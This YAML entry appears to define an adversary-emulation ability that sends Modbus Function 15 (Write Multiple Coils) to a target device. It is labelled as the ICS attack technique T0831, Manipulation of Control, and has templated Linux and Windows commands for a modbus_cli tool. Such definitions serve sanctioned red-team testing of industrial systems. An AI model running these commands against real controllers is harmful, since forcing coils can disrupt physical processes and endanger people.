---

- id: fe321da2-e183-44a3-b423-b8cba9a8bda0
  name: Modbus Write Multiple Coils
  description: |
    Modbus Function 15 (0x0F): Write Multiple Coils

    This function code is used to force each coil in a sequence of coils to either ON or OFF in a remote device. Addressing starts at 0 (e.g. coils 1-5 = addresses 0-4).
  tactic: impact
  technique:
    attack_id: T0831
    name: Manipulation of Control
  repeatable: True
  platforms:
    linux:
      sh:
        command:
          './modbus_cli #{modbus.server.ip} --port #{modbus.server.port} write_multi_c #{modbus.write.coil.start} #{modbus.write.coil.value} #{modbus.write.coil.count}'
        payloads:
        - modbus_cli
    windows:
      psh:
        command:
          '.\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} write_multi_c #{modbus.write.coil.start} #{modbus.write.coil.value} #{modbus.write.coil.count}'
        payloads:
        - modbus_cli.exe
